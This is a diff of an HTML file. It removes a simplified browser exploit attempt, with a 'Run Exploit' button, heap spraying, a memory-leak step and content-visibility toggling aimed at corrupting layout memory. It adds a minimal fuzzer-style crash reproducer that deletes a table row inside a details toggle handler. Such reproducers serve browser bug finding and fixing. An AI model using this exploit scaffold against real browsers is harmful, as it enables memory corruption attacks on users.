@@ -2,88 +2,42 @@
 <html>
 <head>
     <style>
-        .outer {
-            width: 200px;
-            height: 200px;
-            overflow: hidden;
-            position: relative;
-            contain: strict;
+        :not(marker) {
+            background: url(#svgvar00007) repeat-x scroll top left;
+            zoom: 50%;
         }
-        .inner {
-            width: 100px;
-            height: 100px;
-            position: absolute;
+        details {
+            font: 1pt monospace;
             content-visibility: auto;
-            z-index: 1;
         }
-        .child {
-            width: 50px;
-            height: 50px;
-            position: absolute;
-            content-visibility: hidden;
-        }
-        button {
-            margin: 10px;
-            padding: 10px 20px;
-            font-size: 16px;
+        table {
+            float: right;
         }
     </style>
-</head>
-<body>
-    <button onclick="startLoop()">Run Exploit</button>
-    <div class="outer" id="outer">
-        <div class="inner" id="inner">
-            <div class="child" id="child"></div>
-        </div>
-    </div>
     <script>
-        let spray = [];
-        function sprayHeap() {
-            // Create controlled objects for heap grooming
-            for (let i = 0; i < 500; i++) {
-                let arr = new ArrayBuffer(0x80);
-                let view = new DataView(arr);
-                view.setUint32(0, 0x41414141, true);
-                spray.push(view);
-            }
+        function testRun() {
+            document.getElementById('buttonID').outerHTML = "undefined";
         }
-
-        function leakMemory() {
-            // Attempt to leak memory address (simplified)
-            let obj = { a: 0x42424242, b: new ArrayBuffer(0x100) };
-            spray.push(obj);
-            return obj;
-        }
-
-        function trigger() {
-            let outer = document.getElementById('outer');
-            let inner = document.getElementById('inner');
-            let child = document.getElementById('child');
-
-            child.style.contentVisibility = 'visible';
-            outer.style.overflow = 'scroll';
-            setTimeout(() => {
-                child.style.contentVisibility = 'hidden';
-                outer.style.overflow = 'hidden';
-                sprayHeap();
-                let leakedObj = leakMemory();
-                let newDiv = document.createElement('div');
-                newDiv.style.cssText = 'position: absolute; width: 50px; height: 50px; z-index: 2; content-visibility: auto;';
-                inner.appendChild(newDiv);
-                setTimeout(() => {
-                    inner.style.zIndex = '3';
-                    inner.removeChild(newDiv);
-                    // Attempt to access potentially corrupted object
-                    console.log(leakedObj.a);
-                }, 15);
-            }, 15);
-        }
-
-        function startLoop() {
-            for (let i = 0; i < 30; i++) {
-                setTimeout(trigger, i * 150);
-            }
+        function eventhandler3() {
+            document.getElementById('detailsID').open = false;
+            document.body.offsetHeight;
+            document.getElementById('tableID').deleteRow(1);
         }
     </script>
+</head>
+<body onload="testRun()">
+    <button id="buttonID"></button>
+    <details id="detailsID" ontoggle="eventhandler3()" open="true">
+        <summary>
+            <table id="tableID" align="right">
+                <tr><td>Row 1</td></tr>
+                <tr><td>Row 2</td></tr>
+            </table>
+            <iframe srcdoc="content"></iframe>
+        </summary>
+        <span>
+            <li><embed><ol>
+        </span>
+    </details>
 </body>
 </html>
